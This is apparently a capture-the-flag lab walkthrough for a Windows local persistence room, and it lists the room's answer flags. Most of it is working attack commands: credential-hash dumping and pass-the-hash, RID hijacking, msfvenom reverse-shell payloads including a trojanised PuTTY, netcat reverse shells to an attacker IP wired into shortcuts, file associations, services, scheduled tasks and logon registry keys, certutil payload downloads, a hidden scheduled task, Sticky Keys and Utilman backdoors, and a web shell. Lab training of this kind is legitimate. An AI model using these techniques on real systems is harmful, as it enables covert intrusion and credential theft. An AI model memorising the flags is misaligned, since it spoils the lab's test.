# Windows Local Persistence - Medium

1. [Tampering with Unprivileged Accounts](#tampering-with-unprivileged-accounts)
2. [Backdooring Files](#backdooring-files)
3. [Abusing Services](#abusing-services)
4. [Abusing Scheduled Tasks](#abusing-scheduled-tasks)
5. [Logon Triggered Persistence](#logon-triggered-persistence)
6. [Backdooring the Login Screen / RDP](#backdooring-the-login-screen--rdp)
7. [Persisting Through Existing Services](#persisting-through-existing-services)

## Tampering with Unprivileged Accounts

* Persistence - creating alternative ways to regain access to a host without going through exploitation all over again.

* Tampering with unprivileged users makes it harder for the blue teams to detect activity.

* Assign Group Memberships:

```cmd
#assuming we have dumped hashes in victim machine
#and acquired passwords of unprivileged users

#add unprivileged user to Administrators group for admin privileges
net localgroup administrators thmuser0 /add
```

```cmd
#we can also use Backup Operators group
net localgroup "Backup Operators" thmuser1 /add

#now we need it to add it to RDP or WinRM groups
net localgroup "Remote Management Users" thmuser1 /add

#disable LocalAccountTokenFilterPolicy of UAC to get admin privileges
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1

#given, creds for WinRM are thmuser1:Password321
#WinRM connection from attacker machine
evil-winrm -i 10.10.113.252 -u thmuser1 -p Password321

#gives Admin access
whoami /groups

#make backup of SAM and SYSTEM files and download them
reg save hklm\system system.bak

reg save hklm\sam sam.bak

download system.bak

download sam.bak

#dump password hashes in attacker machine
python3.9 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL

#perform pass-the-hash to get Admin privileges in target machine
evil-winrm -i 10.10.113.252 -u Administrator -H f3118544a831e728781d780cfdb9c1fa

cd C:\flags

.\flag1.exe
```

* Special Privileges and Security Descriptors:

```cmd
#the Backups Operators group has SeBackupPrivilege and SeRestorePrivilege enabled
#we can assign these privileges to any user

#export current config to temp file
secedit /export /cfg config.inf

#edit config.inf file such that the user 'thmuser2' is added in the privileges required

#convert .inf to .sdb and load config file
secedit /import /cfg config.inf /db config.sdb

secedit /configure /db config.sdb /cfg config.inf

#now edit security descriptor for WinRM
#in powershell
Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
#add and give full permissions to 'thmuser2'

#we can connect to WinRM from attacker machine now
#thmuser2:Password321
evil-winrm -i 10.10.113.252 -u thmuser2 -p Password321

net user thmuser2

C:\flags\.\flag2.exe
```

* RID Hijacking:

```cmd
#we can tamper with the registry value of RID (relative ID)
#and make Windows assign Admin access token to unprivileged user
#by giving them both same RIDs
#admin RID=500

#get RIDs
wmic useraccount get name,sid
#RID is last part of SID
#thmuser3 RID is 1010

cd C:\tools\pstools

#running Regedit using SYSTEM account to access SAM
PsExec64.exe -i -s regedit

#in regedit, navigate to HKLM\SAM\SAM\Domains\Account\Users
#here, RID is in hex, so hex of 1010 is 0x3F2
#in that, edit the 'F' value from F203 to F401
#it uses little-endian notation, so the bytes are reversed

#now we can use RDP to login as thmuser3
#thmuser3:Password321
xfreerdp /u:thmuser3 /p:Password321 /v:10.10.113.252

C:\flags\.\flag3.exe
```

```markdown
1. flag1? - THM{FLAG_BACKED_UP!}

2. flag2? - THM{IM_JUST_A_NORMAL_USER}

3. flag3? - THM{TRUST_ME_IM_AN_ADMIN}
```

## Backdooring Files

* By modifying files, we can plant backdoors that will get executed whenever the user access them.

* Executable Files:

```cmd
#we can replace a commonly-used executable with payload
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=10.10.53.136 lport=4444 -b "\x00" -f exe -o puttyX.exe
```

* Shortcut Files:

```ps
#create PowerShell script backdoor.ps1
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe 10.10.53.136 4445"
#include attacker IP
C:\Windows\System32\calc.exe
```

```cmd
#now edit shortcut file properties
#Shortcut > Target - powershell.exe -WindowStyle hidden C:\Users\Administrator\Desktop\backdoor.ps1

#in attacker machine
nc -nvlp 4445
#double-click shortcut

C:\flags\.\flag5
```

* Hijacking File Associations:

```cmd
#hijack file associations
#force system to run a shell whenever a file type is opened

#we can check ProgID for an extension in HKLM\SOFWTARE\Classes\
#we can check for .txt, progID is txtfile
#then, search for subkey for progID
#HKLM\SOFTWARE\Classes\txtfile\shell\open\command

#we can replace the entry here, with a backdoor script
#replace entry with command
#powershell -windowstyle hidden C:\Users\Administrator\Desktop\backdoor2.ps1 %1

#in attacker machine
nc -nvlp 4448
#open text file in Windows machine
C:\flags\.\flag6
```

```ps
#required backdoor script
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe 10.10.53.136 4448"
C:\Windows\system32\NOTEPAD.EXE $args[0]
```

```markdown
1. flag5? - THM{NO_SHORTCUTS_IN_LIFE}

2. flag6? - THM{TXT_FILES_WOULD_NEVER_HURT_YOU}
```

## Abusing Services

* By abusing services, we can regain control of victim machine each time it is started.

* Creating backdoor services:

```cmd
#in attacker machine
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.53.136 LPORT=4448 -f exe-service -o rev-svc.exe
#this creates an executable payload, which can be copied to target system now

python3 -m http.server

nc -nvlp 4448

#in victim machine
certutil.exe -urlcache -f http://10.10.53.136:8000/rev-svc.exe rev-svc.exe

#create service
sc.exe create THMservice2 binPath= "C:\Users\Administrator\Desktop\rev-svc.exe" start= auto

sc.exe start THMservice2
#this gives us a reverse shell
```

* Modifying existing services:

```cmd
#list of available services
sc.exe query state=all

sc.exe qc THMService3
#shows a stopped service's config
#for persistence, start_type should be automatic
#service_start_name should be set to LocalSystem
#and binary_path_name should point to payload

sc.exe config THMservice3 binPath= "C:\Users\Administrator\Desktop\rev-svc.exe" start= auto obj= "LocalSystem"

#start a listener on attacker machine
#start service
sc.exe start THMservice3
#we get access
```

```markdown
1. flag7? - THM{SUSPICIOUS_SERVICES}

2. flag8? - THM{IN_PLAIN_SIGHT}
```

## Abusing Scheduled Tasks

* Task Scheduler:

```cmd
schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe 10.10.53.136 4449" /ru SYSTEM
#creates a scheduled task that runs every 1 minute
#executes a nc64 reverse shell
#run as SYSTEM

schtasks /query /tn thm-taskbackdoor
#check task

#we can delete the task's security descriptor(SD)
#to make our task invisible
C:\tools\pstools\PsExec64.exe -s -i regedit
#regedit as SYSTEM to delete SD
#HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\

schtasks /query /tn thm-taskbackdoor
#this won't show a task now

#start listener on port 4449 in attacker machine
```

```markdown
1. flag9? - THM{JUST_A_MATTER_OF_TIME}
```

## Logon Triggered Persistence

* This refers to payloads that get executed whenever a user logs into the system.

* Startup Folder:

```cmd
#executable can run when an user logs in if it is in the path
#C:\Users\user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

#for all users, the path is
#C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp

#in attacker machine
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.53.136 LPORT=4450 -f exe -o revshell.exe

python3 -m http.server

#in victim machine
certutil.exe -urlcache -f http://10.10.53.136:8000/revshell.exe revshell.exe

copy revshell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"

#start listener in attacker machine
#and log out and log in the victim machine
```

* Run / RunOnce:

```cmd
#we can modify Run/RunOnce registry keys

#create payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.53.136 LPORT=4451 -f exe -o revshell.exe

python3 -m http.server

#in victim machine
certutil.exe -urlcache -f http://10.10.53.136:8000/revshell.exe revshell.exe

move revshell.exe C:\Windows

#now create a REG_EXPAND_SZ registry entry under the Run/RunOnce reg keys
#HKLM\Software\Microsoft\Windows\CurrentVersion\Run, for example

#start a listener on attacker machine
#and sign out and sign in again on victim machine to get shell
```

* Winlogon:

```cmd
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.53.136 LPORT=4452 -f exe -o revshell.exe

#transfer payload to victim machine

move revshell.exe C:\Windows

#modify Winlogon registry keys
#alter either shell or Userinit under
#HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\
#do not replace the executable in entry; append the command by a comma

#start a listener on attacker
#log out and log into the victim to get shell
```

* Logon scripts:

```cmd
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.53.136 LPORT=4453 -f exe -o revshell.exe

#transfer payload to victim machine

move revshell.exe C:\Windows

#we need to modify UserInitMprLogonScript in
#HKCU\Environment registry key
#create UserInitMprLogonScript of REG_EXPAND_SZ type, with data as payload path

#start listener and log out and log into victim to get shell
```

```markdown
1. flag10? - THM{NO_NO_AFTER_YOU}

2. flag11? - THM{LET_ME_HOLD_THE_DOOR_FOR_YOU}

3. flag12? - THM{I_INSIST_GO_FIRST}

4. flag13? - THM{USER_TRIGGERED_PERSISTENCE_FTW}
```

## Backdooring the Login Screen / RDP

* Sticky Keys:

```cmd
#we can abuse the Sticky Keys feature
#which executes the binary C:\Windows\System32\sethc.exe

#we can replace sethc.exe with cmd.exe

#take ownership of file
takeown /f C:\Windows\System32\sethc.exe

#grant current user modify permissions
icacls C:\Windows\System32\sethc.exe /grant Administrator:F

copy c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe

#now lock session, press SHIFT key 5 times
#to get terminal with SYSTEM priv
```

* Utilman:

```cmd
takeown /f c:\Windows\System32\utilman.exe

icacls C:\Windows\System32\utilman.exe /grant Administrator:F

copy c:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe

#lock session, and click on 'Ease of Access' button to get SYSTEM access
```

```markdown
1. flag14? - THM{BREAKING_THROUGH_LOGIN}

2. flag15? - THM{THE_LOGIN_SCREEN_IS_MERELY_A_SUGGESTION}
```

## Persisting Through Existing Services

* Using Web Shells:

```cmd
#we can upload a web shell to the web directory
#this can grant us privileges us IIS configured user

#transfer ASP.NET web shell to victim machine
move shell.aspx C:\inetpub\wwwroot\

#we can visit http://10.10.113.252/shell.aspx
#and run commands in cmd.exe
```

* Using MSSQL as a Backdoor:

```cmd
#follow walkthrough given on THM
```

```markdown
1. flag16? - THM{EZ_WEB_PERSISTENCE}

2. flag17? - THM{I_LIVE_IN_YOUR_DATABASE}
```
